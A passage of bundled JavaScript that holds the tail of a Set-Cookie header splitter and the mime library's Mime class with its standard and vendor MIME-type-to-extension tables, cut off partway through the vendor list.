            for (lastComma = pos, pos += 1, skipWhitespace(), nextStart = pos; pos < cookiesString.length && notSpecialChar(); )
              pos += 1;
            pos < cookiesString.length && cookiesString.charAt(pos) === "=" ? (cookiesSeparatorFound = !0, pos = nextStart, cookiesStrings.push(cookiesString.substring(start, lastComma)), start = pos) : pos = lastComma + 1;
          } else
            pos += 1;
        (!cookiesSeparatorFound || pos >= cookiesString.length) && cookiesStrings.push(cookiesString.substring(start, cookiesString.length));
      }
      return cookiesStrings;
    }
    module.exports = parse;
    module.exports.parse = parse;
    module.exports.parseString = parseString;
    module.exports.splitCookiesString = splitCookiesString2;
  }
});

// node_modules/mime/Mime.js
var require_Mime = __commonJS({
  "node_modules/mime/Mime.js"(exports, module) {
    "use strict";
    function Mime() {
      this._types = /* @__PURE__ */ Object.create(null), this._extensions = /* @__PURE__ */ Object.create(null);
      for (let i = 0; i < arguments.length; i++)
        this.define(arguments[i]);
      this.define = this.define.bind(this), this.getType = this.getType.bind(this), this.getExtension = this.getExtension.bind(this);
    }
    Mime.prototype.define = function(typeMap, force) {
      for (let type in typeMap) {
        let extensions = typeMap[type].map(function(t) {
          return t.toLowerCase();
        });
        type = type.toLowerCase();
        for (let i = 0; i < extensions.length; i++) {
          let ext = extensions[i];
          if (ext[0] !== "*") {
            if (!force && ext in this._types)
              throw new Error(
                'Attempt to change mapping for "' + ext + '" extension from "' + this._types[ext] + '" to "' + type + '". Pass `force=true` to allow this, otherwise remove "' + ext + '" from the list of extensions for "' + type + '".'
              );
            this._types[ext] = type;
          }
        }
        if (force || !this._extensions[type]) {
          let ext = extensions[0];
          this._extensions[type] = ext[0] !== "*" ? ext : ext.substr(1);
        }
      }
    };
    Mime.prototype.getType = function(path2) {
      path2 = String(path2);
      let last = path2.replace(/^.*[/\\]/, "").toLowerCase(), ext = last.replace(/^.*\./, "").toLowerCase(), hasPath = last.length < path2.length;
      return (ext.length < last.length - 1 || !hasPath) && this._types[ext] || null;
    };
    Mime.prototype.getExtension = function(type) {
      return type = /^\s*([^;\s]*)/.test(type) && RegExp.$1, type && this._extensions[type.toLowerCase()] || null;
    };
    module.exports = Mime;
  }
});

// node_modules/mime/types/standard.js
var require_standard = __commonJS({
  "node_modules/mime/types/standard.js"(exports, module) {
    module.exports = { "application/andrew-inset": ["ez"], "application/applixware": ["aw"], "application/atom+xml": ["atom"], "application/atomcat+xml": ["atomcat"], "application/atomdeleted+xml": ["atomdeleted"], "application/atomsvc+xml": ["atomsvc"], "application/atsc-dwd+xml": ["dwd"], "application/atsc-held+xml": ["held"], "application/atsc-rsat+xml": ["rsat"], "application/bdoc": ["bdoc"], "application/calendar+xml": ["xcs"], "application/ccxml+xml": ["ccxml"], "application/cdfx+xml": ["cdfx"], "application/cdmi-capability": ["cdmia"], "application/cdmi-container": ["cdmic"], "application/cdmi-domain": ["cdmid"], "application/cdmi-object": ["cdmio"], "application/cdmi-queue": ["cdmiq"], "application/cu-seeme": ["cu"], "application/dash+xml": ["mpd"], "application/davmount+xml": ["davmount"], "application/docbook+xml": ["dbk"], "application/dssc+der": ["dssc"], "application/dssc+xml": ["xdssc"], "application/ecmascript": ["es", "ecma"], "application/emma+xml": ["emma"], "application/emotionml+xml": ["emotionml"], "application/epub+zip": ["epub"], "application/exi": ["exi"], "application/express": ["exp"], "application/fdt+xml": ["fdt"], "application/font-tdpfr": ["pfr"], "application/geo+json": ["geojson"], "application/gml+xml": ["gml"], "application/gpx+xml": ["gpx"], "application/gxf": ["gxf"], "application/gzip": ["gz"], "application/hjson": ["hjson"], "application/hyperstudio": ["stk"], "application/inkml+xml": ["ink", "inkml"], "application/ipfix": ["ipfix"], "application/its+xml": ["its"], "application/java-archive": ["jar", "war", "ear"], "application/java-serialized-object": ["ser"], "application/java-vm": ["class"], "application/javascript": ["js", "mjs"], "application/json": ["json", "map"], "application/json5": ["json5"], "application/jsonml+json": ["jsonml"], "application/ld+json": ["jsonld"], "application/lgr+xml": ["lgr"], "application/lost+xml": ["lostxml"], "application/mac-binhex40": ["hqx"], "application/mac-compactpro": ["cpt"], "application/mads+xml": ["mads"], "application/manifest+json": ["webmanifest"], "application/marc": ["mrc"], "application/marcxml+xml": ["mrcx"], "application/mathematica": ["ma", "nb", "mb"], "application/mathml+xml": ["mathml"], "application/mbox": ["mbox"], "application/mediaservercontrol+xml": ["mscml"], "application/metalink+xml": ["metalink"], "application/metalink4+xml": ["meta4"], "application/mets+xml": ["mets"], "application/mmt-aei+xml": ["maei"], "application/mmt-usd+xml": ["musd"], "application/mods+xml": ["mods"], "application/mp21": ["m21", "mp21"], "application/mp4": ["mp4s", "m4p"], "application/msword": ["doc", "dot"], "application/mxf": ["mxf"], "application/n-quads": ["nq"], "application/n-triples": ["nt"], "application/node": ["cjs"], "application/octet-stream": ["bin", "dms", "lrf", "mar", "so", "dist", "distz", "pkg", "bpk", "dump", "elc", "deploy", "exe", "dll", "deb", "dmg", "iso", "img", "msi", "msp", "msm", "buffer"], "application/oda": ["oda"], "application/oebps-package+xml": ["opf"], "application/ogg": ["ogx"], "application/omdoc+xml": ["omdoc"], "application/onenote": ["onetoc", "onetoc2", "onetmp", "onepkg"], "application/oxps": ["oxps"], "application/p2p-overlay+xml": ["relo"], "application/patch-ops-error+xml": ["xer"], "application/pdf": ["pdf"], "application/pgp-encrypted": ["pgp"], "application/pgp-signature": ["asc", "sig"], "application/pics-rules": ["prf"], "application/pkcs10": ["p10"], "application/pkcs7-mime": ["p7m", "p7c"], "application/pkcs7-signature": ["p7s"], "application/pkcs8": ["p8"], "application/pkix-attr-cert": ["ac"], "application/pkix-cert": ["cer"], "application/pkix-crl": ["crl"], "application/pkix-pkipath": ["pkipath"], "application/pkixcmp": ["pki"], "application/pls+xml": ["pls"], "application/postscript": ["ai", "eps", "ps"], "application/provenance+xml": ["provx"], "application/pskc+xml": ["pskcxml"], "application/raml+yaml": ["raml"], "application/rdf+xml": ["rdf", "owl"], "application/reginfo+xml": ["rif"], "application/relax-ng-compact-syntax": ["rnc"], "application/resource-lists+xml": ["rl"], "application/resource-lists-diff+xml": ["rld"], "application/rls-services+xml": ["rs"], "application/route-apd+xml": ["rapd"], "application/route-s-tsid+xml": ["sls"], "application/route-usd+xml": ["rusd"], "application/rpki-ghostbusters": ["gbr"], "application/rpki-manifest": ["mft"], "application/rpki-roa": ["roa"], "application/rsd+xml": ["rsd"], "application/rss+xml": ["rss"], "application/rtf": ["rtf"], "application/sbml+xml": ["sbml"], "application/scvp-cv-request": ["scq"], "application/scvp-cv-response": ["scs"], "application/scvp-vp-request": ["spq"], "application/scvp-vp-response": ["spp"], "application/sdp": ["sdp"], "application/senml+xml": ["senmlx"], "application/sensml+xml": ["sensmlx"], "application/set-payment-initiation": ["setpay"], "application/set-registration-initiation": ["setreg"], "application/shf+xml": ["shf"], "application/sieve": ["siv", "sieve"], "application/smil+xml": ["smi", "smil"], "application/sparql-query": ["rq"], "application/sparql-results+xml": ["srx"], "application/srgs": ["gram"], "application/srgs+xml": ["grxml"], "application/sru+xml": ["sru"], "application/ssdl+xml": ["ssdl"], "application/ssml+xml": ["ssml"], "application/swid+xml": ["swidtag"], "application/tei+xml": ["tei", "teicorpus"], "application/thraud+xml": ["tfi"], "application/timestamped-data": ["tsd"], "application/toml": ["toml"], "application/trig": ["trig"], "application/ttml+xml": ["ttml"], "application/ubjson": ["ubj"], "application/urc-ressheet+xml": ["rsheet"], "application/urc-targetdesc+xml": ["td"], "application/voicexml+xml": ["vxml"], "application/wasm": ["wasm"], "application/widget": ["wgt"], "application/winhlp": ["hlp"], "application/wsdl+xml": ["wsdl"], "application/wspolicy+xml": ["wspolicy"], "application/xaml+xml": ["xaml"], "application/xcap-att+xml": ["xav"], "application/xcap-caps+xml": ["xca"], "application/xcap-diff+xml": ["xdf"], "application/xcap-el+xml": ["xel"], "application/xcap-ns+xml": ["xns"], "application/xenc+xml": ["xenc"], "application/xhtml+xml": ["xhtml", "xht"], "application/xliff+xml": ["xlf"], "application/xml": ["xml", "xsl", "xsd", "rng"], "application/xml-dtd": ["dtd"], "application/xop+xml": ["xop"], "application/xproc+xml": ["xpl"], "application/xslt+xml": ["*xsl", "xslt"], "application/xspf+xml": ["xspf"], "application/xv+xml": ["mxml", "xhvml", "xvml", "xvm"], "application/yang": ["yang"], "application/yin+xml": ["yin"], "application/zip": ["zip"], "audio/3gpp": ["*3gpp"], "audio/adpcm": ["adp"], "audio/amr": ["amr"], "audio/basic": ["au", "snd"], "audio/midi": ["mid", "midi", "kar", "rmi"], "audio/mobile-xmf": ["mxmf"], "audio/mp3": ["*mp3"], "audio/mp4": ["m4a", "mp4a"], "audio/mpeg": ["mpga", "mp2", "mp2a", "mp3", "m2a", "m3a"], "audio/ogg": ["oga", "ogg", "spx", "opus"], "audio/s3m": ["s3m"], "audio/silk": ["sil"], "audio/wav": ["wav"], "audio/wave": ["*wav"], "audio/webm": ["weba"], "audio/xm": ["xm"], "font/collection": ["ttc"], "font/otf": ["otf"], "font/ttf": ["ttf"], "font/woff": ["woff"], "font/woff2": ["woff2"], "image/aces": ["exr"], "image/apng": ["apng"], "image/avif": ["avif"], "image/bmp": ["bmp"], "image/cgm": ["cgm"], "image/dicom-rle": ["drle"], "image/emf": ["emf"], "image/fits": ["fits"], "image/g3fax": ["g3"], "image/gif": ["gif"], "image/heic": ["heic"], "image/heic-sequence": ["heics"], "image/heif": ["heif"], "image/heif-sequence": ["heifs"], "image/hej2k": ["hej2"], "image/hsj2": ["hsj2"], "image/ief": ["ief"], "image/jls": ["jls"], "image/jp2": ["jp2", "jpg2"], "image/jpeg": ["jpeg", "jpg", "jpe"], "image/jph": ["jph"], "image/jphc": ["jhc"], "image/jpm": ["jpm"], "image/jpx": ["jpx", "jpf"], "image/jxr": ["jxr"], "image/jxra": ["jxra"], "image/jxrs": ["jxrs"], "image/jxs": ["jxs"], "image/jxsc": ["jxsc"], "image/jxsi": ["jxsi"], "image/jxss": ["jxss"], "image/ktx": ["ktx"], "image/ktx2": ["ktx2"], "image/png": ["png"], "image/sgi": ["sgi"], "image/svg+xml": ["svg", "svgz"], "image/t38": ["t38"], "image/tiff": ["tif", "tiff"], "image/tiff-fx": ["tfx"], "image/webp": ["webp"], "image/wmf": ["wmf"], "message/disposition-notification": ["disposition-notification"], "message/global": ["u8msg"], "message/global-delivery-status": ["u8dsn"], "message/global-disposition-notification": ["u8mdn"], "message/global-headers": ["u8hdr"], "message/rfc822": ["eml", "mime"], "model/3mf": ["3mf"], "model/gltf+json": ["gltf"], "model/gltf-binary": ["glb"], "model/iges": ["igs", "iges"], "model/mesh": ["msh", "mesh", "silo"], "model/mtl": ["mtl"], "model/obj": ["obj"], "model/step+xml": ["stpx"], "model/step+zip": ["stpz"], "model/step-xml+zip": ["stpxz"], "model/stl": ["stl"], "model/vrml": ["wrl", "vrml"], "model/x3d+binary": ["*x3db", "x3dbz"], "model/x3d+fastinfoset": ["x3db"], "model/x3d+vrml": ["*x3dv", "x3dvz"], "model/x3d+xml": ["x3d", "x3dz"], "model/x3d-vrml": ["x3dv"], "text/cache-manifest": ["appcache", "manifest"], "text/calendar": ["ics", "ifb"], "text/coffeescript": ["coffee", "litcoffee"], "text/css": ["css"], "text/csv": ["csv"], "text/html": ["html", "htm", "shtml"], "text/jade": ["jade"], "text/jsx": ["jsx"], "text/less": ["less"], "text/markdown": ["markdown", "md"], "text/mathml": ["mml"], "text/mdx": ["mdx"], "text/n3": ["n3"], "text/plain": ["txt", "text", "conf", "def", "list", "log", "in", "ini"], "text/richtext": ["rtx"], "text/rtf": ["*rtf"], "text/sgml": ["sgml", "sgm"], "text/shex": ["shex"], "text/slim": ["slim", "slm"], "text/spdx": ["spdx"], "text/stylus": ["stylus", "styl"], "text/tab-separated-values": ["tsv"], "text/troff": ["t", "tr", "roff", "man", "me", "ms"], "text/turtle": ["ttl"], "text/uri-list": ["uri", "uris", "urls"], "text/vcard": ["vcard"], "text/vtt": ["vtt"], "text/xml": ["*xml"], "text/yaml": ["yaml", "yml"], "video/3gpp": ["3gp", "3gpp"], "video/3gpp2": ["3g2"], "video/h261": ["h261"], "video/h263": ["h263"], "video/h264": ["h264"], "video/iso.segment": ["m4s"], "video/jpeg": ["jpgv"], "video/jpm": ["*jpm", "jpgm"], "video/mj2": ["mj2", "mjp2"], "video/mp2t": ["ts"], "video/mp4": ["mp4", "mp4v", "mpg4"], "video/mpeg": ["mpeg", "mpg", "mpe", "m1v", "m2v"], "video/ogg": ["ogv"], "video/quicktime": ["qt", "mov"], "video/webm": ["webm"] };
  }
});

// node_modules/mime/types/other.js
var require_other = __commonJS({
  "node_modules/mime/types/other.js"(exports, module) {
    module.exports = { "application/prs.cww": ["cww"], "application/vnd.1000minds.decision-model+xml": ["1km"], "application/vnd.3gpp.pic-bw-large": ["plb"], "application/vnd.3gpp.pic-bw-small": ["psb"], "application/vnd.3gpp.pic-bw-var": ["pvb"], "application/vnd.3gpp2.tcap": ["tcap"], "application/vnd.3m.post-it-notes": ["pwn"], "application/vnd.accpac.simply.aso": ["aso"], "application/vnd.accpac.simply.imp": ["imp"], "application/vnd.acucobol": ["acu"], "application/vnd.acucorp": ["atc", "acutc"], "application/vnd.adobe.air-application-installer-package+zip": ["air"], "application/vnd.adobe.formscentral.fcdt": ["fcdt"], "application/vnd.adobe.fxp": ["fxp", "fxpl"], "application/vnd.adobe.xdp+xml": ["xdp"], "application/vnd.adobe.xfdf": ["xfdf"], "application/vnd.ahead.space": ["ahead"], "application/vnd.airzip.filesecure.azf": ["azf"], "application/vnd.airzip.filesecure.azs": ["azs"], "application/vnd.amazon.ebook": ["azw"], "application/vnd.americandynamics.acc": ["acc"], "application/vnd.amiga.ami": ["ami"], "application/vnd.android.package-archive": ["apk"], "application/vnd.anser-web-certificate-issue-initiation": ["cii"], "application/vnd.anser-web-funds-transfer-initiation": ["fti"], "application/vnd.antix.game-component": ["atx"], "application/vnd.apple.installer+xml": ["mpkg"], "application/vnd.apple.keynote": ["key"], "application/vnd.apple.mpegurl": ["m3u8"], "application/vnd.apple.numbers": ["numbers"], "application/vnd.apple.pages": ["pages"], "application/vnd.apple.pkpass": ["pkpass"], "application/vnd.aristanetworks.swi": ["swi"], "application/vnd.astraea-software.iota": ["iota"], "application/vnd.audiograph": ["aep"], "application/vnd.balsamiq.bmml+xml": ["bmml"], "application/vnd.blueice.multipass": ["mpm"], "application/vnd.bmi": ["bmi"], "application/vnd.businessobjects": ["rep"], "application/vnd.chemdraw+xml": ["cdxml"], "application/vnd.chipnuts.karaoke-mmd": ["mmd"], "application/vnd.cinderella": ["cdy"], "application/vnd.citationstyles.style+xml": ["csl"], "application/vnd.claymore": ["cla"], "application/vnd.cloanto.rp9": ["rp9"], "application/vnd.clonk.c4group": ["c4g", "c4d", "c4f", "c4p", "c4u"], "application/vnd.cluetrust.cartomobile-config": ["c11amc"], "application/vnd.cluetrust.cartomobile-config-pkg": ["c11amz"], "application/vnd.commonspace": ["csp"], "application/vnd.contact.cmsg": ["cdbcmsg"], "application/vnd.cosmocaller": ["cmc"], "application/vnd.crick.clicker": ["clkx"], "application/vnd.crick.clicker.keyboard": ["clkk"], "application/vnd.crick.clicker.palette": ["clkp"], "application/vnd.crick.clicker.template": ["clkt"], "application/vnd.crick.clicker.wordbank": ["clkw"], "application/vnd.criticaltools.wbs+xml": ["wbs"], "application/vnd.ctc-posml": ["pml"], "application/vnd.cups-ppd": ["ppd"], "application/vnd.curl.car": ["car"], "application/vnd.curl.pcurl": ["pcurl"], "application/vnd.dart": ["dart"], "application/vnd.data-vision.rdz": ["rdz"], "application/vnd.dbf": ["dbf"], "application/vnd.dece.data": ["uvf", "uvvf", "uvd", "uvvd"], "application/vnd.dece.ttml+xml": ["uvt", "uvvt"], "application/vnd.dece.unspecified": ["uvx", "uvvx"], "application/vnd.dece.zip": ["uvz", "uvvz"], "application/vnd.denovo.fcselayout-link": ["fe_launch"], "application/vnd.dna": ["dna"], "application/vnd.dolby.mlp": ["mlp"], "application/vnd.dpgraph": ["dpg"], "application/vnd.dreamfactory": ["dfac"], "application/vnd.ds-keypoint": ["kpxx"], "application/vnd.dvb.ait": ["ait"], "application/vnd.dvb.service": ["svc"], "application/vnd.dynageo": ["geo"], "application/vnd.ecowin.chart": ["mag"], "application/vnd.enliven": ["nml"], "application/vnd.epson.esf": ["esf"], "application/vnd.epson.msf": ["msf"], "application/vnd.epson.quickanime": ["qam"], "application/vnd.epson.salt": ["slt"], "application/vnd.epson.ssf": ["ssf"], "application/vnd.eszigno3+xml": ["es3", "et3"], "application/vnd.ezpix-album": ["ez2"], "application/vnd.ezpix-package": ["ez3"], "application/vnd.fdf": ["fdf"], "application/vnd.fdsn.mseed": ["mseed"], "application/vnd.fdsn.seed": ["seed", "dataless"], "application/vnd.flographit": ["gph"], "application/vnd.fluxtime.clip": ["ftc"], "application/vnd.framemaker": ["fm", "frame", "maker", "book"], "application/vnd.frogans.fnc": ["fnc"], "application/vnd.frogans.ltf": ["ltf"], "application/vnd.fsc.weblaunch": ["fsc"], "application/vnd.fujitsu.oasys": ["oas"], "application/vnd.fujitsu.oasys2": ["oa2"], "application/vnd.fujitsu.oasys3": ["oa3"], "application/vnd.fujitsu.oasysgp": ["fg5"], "application/vnd.fujitsu.oasysprs": ["bh2"], "application/vnd.fujixerox.ddd": ["ddd"], "application/vnd.fujixerox.docuworks": ["xdw"], "application/vnd.fujixerox.docuworks.binder": ["xbd"], "application/vnd.fuzzysheet": ["fzs"], "application/vnd.genomatix.tuxedo": ["txd"], "application/vnd.geogebra.file": ["ggb"], "application/vnd.geogebra.tool": ["ggt"], "application/vnd.geometry-explorer": ["gex", "gre"], "application/vnd.geonext": ["gxt"], "application/vnd.geoplan": ["g2w"], "application/vnd.geospace": ["g3w"], "application/vnd.gmx": ["gmx"], "application/vnd.google-apps.document": ["gdoc"], "application/vnd.google-apps.presentation": ["gslides"], "application/vnd.google-apps.spreadsheet": ["gsheet"], "application/vnd.google-earth.kml+xml": ["kml"], "application/vnd.google-earth.kmz": ["kmz"], "application/vnd.grafeq": ["gqf", "gqs"], "application/vnd.groove-account": ["gac"], "application/vnd.groove-help": ["ghf"], "application/vnd.groove-identity-message": ["gim"], "application/vnd.groove-injector": ["grv"], "application/vnd.groove-tool-message": ["gtm"], "application/vnd.groove-tool-template": ["tpl"], "application/vnd.groove-vcard": ["vcg"], "application/vnd.hal+xml": ["hal"], "application/vnd.handheld-entertainment+xml": ["zmm"], "application/vnd.hbci": ["hbci"], "application/vnd.hhe.lesson-player": ["les"], "application/vnd.hp-hpgl": ["hpgl"], "application/vnd.hp-hpid": ["hpid"], "application/vnd.hp-hps": ["hps"], "application/vnd.hp-jlyt": ["jlt"], "application/vnd.hp-pcl": ["pcl"], "application/vnd.hp-pclxl": ["pclxl"], "application/vnd.hydrostatix.sof-data": ["sfd-hdstx"], "application/vnd.ibm.minipay": ["mpy"], "application/vnd.ibm.modcap": ["afp", "listafp", "list3820"], "application/vnd.ibm.rights-management": ["irm"], "application/vnd.ibm.secure-container": ["sc"], "application/vnd.iccprofile": ["icc", "icm"], "application/vnd.igloader": ["igl"], "application/vnd.immervision-ivp": ["ivp"], "application/vnd.immervision-ivu": ["ivu"], "application/vnd.insors.igm": ["igm"], "application/vnd.intercon.formnet": ["xpw", "xpx"], "application/vnd.intergeo": ["i2g"], "application/vnd.intu.qbo": ["qbo"], "application/vnd.intu.qfx": ["qfx"], "application/vnd.ipunplugged.rcprofile": ["rcprofile"], "application/vnd.irepository.package+xml": ["irp"], "application/vnd.is-xpr": ["xpr"], "application/vnd.isac.fcs": ["fcs"], "application/vnd.jam": ["jam"], "application/vnd.jcp.javame.midlet-rms": ["rms"], "application/vnd.jisp": ["jisp"], "application/vnd.joost.joda-archive": ["joda"], "application/vnd.kahootz": ["ktz", "ktr"], "application/vnd.kde.karbon": ["karbon"], "application/vnd.kde.kchart": ["chrt"], "application/vnd.kde.kformula": ["kfo"], "application/vnd.kde.kivio": ["flw"], "application/vnd.kde.kontour": ["kon"], "application/vnd.kde.kpresenter": ["kpr", "kpt"], "application/vnd.kde.kspread": ["ksp"], "application/vnd.kde.kword": ["kwd", "kwt"], "application/vnd.kenameaapp": ["htke"], "application/vnd.kidspiration": ["kia"], "application/vnd.kinar": ["kne", "knp"], "application/vnd.koan": ["skp", "skd", "skt", "skm"], "application/vnd.kodak-descriptor": ["sse"], "application/vnd.las.las+xml": ["lasxml"], "application/vnd.llamagraphics.life-balance.desktop": ["lbd"], "application/vnd.llamagraphics.life-balance.exchange+xml": ["lbe"], "application/vnd.lotus-1-2-3": ["123"], "application/vnd.lotus-approach": ["apr"], "application/vnd.lotus-freelance": ["pre"], "application/vnd.lotus-notes": ["nsf"], "application/vnd.lotus-organizer": ["org"], "application/vnd.lotus-screencam": ["scm"], "application/vnd.lotus-wordpro": ["lwp"], "application/vnd.macports.portpkg": ["portpkg"], "application/vnd.mapbox-vector-tile": ["mvt"], "application/vnd.mcd": ["mcd"], "application/vnd.medcalcdata": ["mc1"], "application/vnd.mediastation.cdkey": ["cdkey"], "application/vnd.mfer": ["mwf"], "application/vnd.mfmp": ["mfm"], "application/vnd.micrografx.flo": ["flo"], "application/vnd.micrografx.igx": ["igx"], "application/vnd.mif": ["mif"], "application/vnd.mobius.daf": ["daf"], "application/vnd.mobius.dis": ["dis"], "application/vnd.mobius.mbk": ["mbk"], "application/vnd.mobius.mqy": ["mqy"], "application/vnd.mobius.msl": ["msl"], "application/vnd.mobius.plc": ["plc"], "application/vnd.mobius.txf": ["txf"], "application/vnd.mophun.application": ["mpn"], "application/vnd.mophun.certificate": ["mpc"], "application/vnd.mozilla.xul+xml": ["xul"], "application/vnd.ms-artgalry": ["cil"], "application/vnd.ms-cab-compressed": ["cab"], "application/vnd.ms-excel": ["xls", "xlm", "xla", "xlc", "xlt", "xlw"], "application/vnd.ms-excel.addin.macroenabled.12": ["xlam"], "application/vnd.ms-excel.sheet.binary.macroenabled.12": ["xlsb"], "application/vnd.ms-excel.sheet.macroenabled.12": ["xlsm"], "application/vnd.ms-excel.template.macroenabled.12": ["xltm"], "application/vnd.ms-fontobject": ["eot"], "application/vnd.ms-htmlhelp": ["chm"], "application/vnd.ms-ims": ["ims"], "application/vnd.ms-lrm": ["lrm"], "application/vnd.ms-officetheme": ["thmx"], "application/vnd.ms-outlook": ["msg"], "application/vnd.ms-pki.seccat": ["cat"], "application/vnd.ms-pki.stl": ["*stl"], "application/vnd.ms-powerpoint": ["ppt", "pps", "pot"], "application/vnd.ms-powerpoint.addin.macroenabled.12": ["ppam"], "application/vnd.ms-powerpoint.presentation.macroenabled.12": ["pptm"], "application/vnd.ms-powerpoint.slide.macroenabled.12": ["sldm"], "application/vnd.ms-powerpoint.slideshow.macroenabled.12": ["ppsm"], "application/vnd.ms-powerpoint.template.macroenabled.12": ["potm"], "application/vnd.ms-project": ["mpp", "mpt"], "application/vnd.ms-word.document.macroenabled.12": ["docm"], "application/vnd.ms-word.template.macroenabled.12": ["dotm"], "application/vnd.ms-works": ["wps", "wks", "wcm", "wdb"], "application/vnd.ms-wpl": ["wpl"], "application/vnd.ms-xpsdocument": ["xps"], "application/vnd.mseq": ["mseq"], "application/vnd.musician": ["mus"], "application/vnd.muvee.style": ["msty"], "application/vnd.mynfc": ["taglet"], "application/vnd.neurolanguage.nlu": ["nlu"], "application/vnd.nitf": ["ntf", "nitf"], "application/vnd.noblenet-directory": ["nnd"], "application/vnd.noblenet-sealer": ["nns"], "application/vnd.noblenet-web": ["nnw"], "application/vnd.nokia.n-gage.ac+xml": ["*ac"], "application/vnd.nokia.n-gage.data": ["ngdat"], "application/vnd.nokia.n-gage.symbian.install": ["n-gage"], "application/vnd.nokia.radio-preset": ["rpst"], "application/vnd.nokia.radio-presets": ["rpss"], "application/vnd.novadigm.edm": ["edm"], "application/vnd.novadigm.edx": ["edx"], "application/vnd.novadigm.ext": ["ext"], "application/vnd.oasis.opendocument.chart": ["odc"], "application/vnd.oasis.opendocument.chart-template": ["otc"], "application/vnd.oasis.opendocument.database": ["odb"], "application/vnd.oasis.opendocument.formula": ["odf"], "application/vnd.oasis.opendocument.formula-template": ["odft"], "application/vnd.oasis.opendocument.graphics": ["odg"], "application/vnd.oasis.opendocument.graphics-template": ["otg"], "application/vnd.oasis.opendocument.image": ["odi"], "application/vnd.oasis.opendocument.image-template": ["oti"], "application/vnd.oasis.opendocument.presentation": ["odp"], "application/vnd.oasis.opendocument.presentation-template": ["otp"], "application/vnd.oasis.opendocument.spreadsheet": ["ods"], "application/vnd.oasis.opendocument.spreadsheet-template": ["ots"], "application/vnd.oasis.opendocument.text": ["odt"], "application/vnd.oasis.opendocument.text-master": ["odm"], "application/vnd.oasis.opendocument.text-template": ["ott"], "application/vnd.oasis.opendocument.text-web": ["oth"], "application/vnd.olpc-sugar": ["xo"], "application/vnd.oma.dd2+xml": ["dd2"], "application/vnd.openblox.game+xml": ["obgx"], "application/vnd.openofficeorg.extension": ["oxt"], "application/vnd.openstreetmap.data+xml": ["osm"], "application/vnd.openxmlformats-officedocument.presentationml.presentation": ["pptx"], "application/vnd.openxmlformats-officedocument.presentationml.slide": ["sldx"], "application/vnd.openxmlformats-officedocument.presentationml.slideshow": ["ppsx"], "application/vnd.openxmlformats-officedocument.presentationml.template": ["potx"], "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet": ["xlsx"], "application/vnd.openxmlformats-officedocument.spreadsheetml.template": ["xltx"], "application/vnd.openxmlformats-officedocument.wordprocessingml.document": ["docx"], "application/vnd.openxmlformats-officedocument.wordprocessingml.template": ["dotx"], "application/vnd.osgeo.mapguide.package": ["mgp"], "application/vnd.osgi.dp": ["dp"], "application/vnd.osgi.subsystem": ["esa"], "application/vnd.palm": ["pdb", "pqa", "oprc"], "application/vnd.pawaafile": ["paw"], "application/vnd.pg.format": ["str"], "application/vnd.pg.osasli": ["ei6"], "application/vnd.picsel": ["efif"], "application/vnd.pmi.widget": ["wg"], "application/vnd.pocketlearn": ["plf"], "application/vnd.powerbuilder6": ["pbd"], "application/vnd.previewsystems.box": ["box"], "application/vnd.proteus.magazine": ["mgz"], "application/vnd.publishare-delta-tree": ["qps"], "application/vnd.pvi.ptid1": ["ptid"], "application/vnd.quark.quarkxpress": ["qxd", "qxt", "qwd", "qwt", "qxl", "qxb"], "application/vnd.rar": ["rar"], "application/vnd.realvnc.bed": ["bed"], "application/vnd.recordare.musicxml": ["mxl"], "application/vnd.recordare.musicxml+xml": ["musicxml"], "application/vnd.rig.cryptonote": ["cryptonote"], "application/vnd.rim.cod": ["cod"], "application/vnd.rn-realmedia": ["rm"], "application/vnd.rn-realmedia-vbr": ["rmvb"], "application/vnd.route66.link66+xml": ["link66"], "application/vnd.sailingtracker.track": ["st"], "application/vnd.seemail": ["see"], "application/vnd.sema": ["sema"], "application/vnd.semd": ["semd"], "application/vnd.semf": ["semf"], "application/vnd.shana.informed.formdata": ["ifm"], "application/vnd.shana.informed.formtemplate": ["itp"], "application/vnd.shana.informed.interchange": ["iif"], "application/vnd.shana.informed.package": ["ipk"], "application/vnd.simtech-mindmapper": ["twd", "twds"], "application/vnd.smaf": ["mmf"], "application/vnd.smart.teacher": ["teacher"], "application/vnd.software602.filler.form+xml": ["fo"], "application/vnd.solent.sdkm+xml": ["sdkm", "sdkd"], "application/vnd.spotfire.dxp": ["dxp"], "application/vnd.spotfire.sfs": ["sfs"], "application/vnd.stardivision.calc": ["sdc"], "application/vnd.stardivision.draw": ["sda"], "application/vnd.stardivision.impress": ["sdd"], "application/vnd.stardivision.math": ["smf"], "application/vnd.stardivision.writer": ["sdw", "vor"], "application/vnd.stardivision.writer-global": ["sgl"], "application/vnd.stepmania.package": ["smzip"], "application/vnd.stepmania.stepchart": ["sm"], "application/vnd.sun.wadl+xml": ["wadl"], "application/vnd.sun.xml.calc": ["sxc"], "application/vnd.sun.xml.calc.template": ["stc"], "application/vnd.sun.xml.draw": ["sxd"], "application/vnd.sun.xml.draw.template": ["std"], "application/vnd.sun.xml.impress": ["sxi"], "application/vnd.sun.xml.impress.template": ["sti"], "application/vnd.sun.xml.math": ["sxm"], "application/vnd.sun.xml.writer": ["sxw"], "application/vnd.sun.xml.writer.global": ["sxg"], "application/vnd.sun.xml.writer.template": ["stw"], "application/vnd.sus-calendar": ["sus", "susp"], "application/vnd.svd": ["svd"], "application/vnd.symbian.install": ["sis", "sisx"], "application/vnd.syncml+xml": ["xsm"], "application/vnd.syncml.dm+wbxml": ["bdm"], "application/vnd.syncml.dm+xml": ["xdm"], "application/vnd.syncml.dmddf+xml": ["ddf"], "application/vnd.tao.intent-module-archive": ["tao"], "application/vnd.tcpdump.pcap": ["pcap", "cap", "dmp"], "application/vnd.tmobile-livetv": ["tmo"], "application/vnd.trid.tpt": ["tpt"], "application/vnd.triscape.mxs": ["mxs"], "application/vnd.trueapp": ["tra"], "application/vnd.ufdl": ["ufd", "ufdl"], "application/vnd.uiq.theme": ["utz"], "application/vnd.umajin": ["umj"], "application/vnd.unity": ["unityweb"], "application/vnd.uoml+xml": ["uoml"], "application/vnd.vcx": ["vcx"], "application/vnd.visio": ["vsd", "vst", "vss", "vsw"], "application/vnd.visionary": ["vis"], "application/vnd.vsf": ["vsf"], "application/vnd.wap.wbxml": ["wbxml"], "application/vnd.wap.wmlc": ["wmlc"], "application/vnd.wap.wmlscriptc": ["wmlsc"], "application/vnd.webturbo": ["wtb"], "application/vnd.wolfram.player": ["nbp"], "application/vnd.wordperfect": ["wpd"], "application/vnd.wqd": ["wqd"], "application/vnd.wt.stf": ["stf"], "application/vnd.xara": ["xar"], "application/vnd.xfdl": ["xfdl"], "application/vnd.yamaha.hv-dic": ["hvd"], 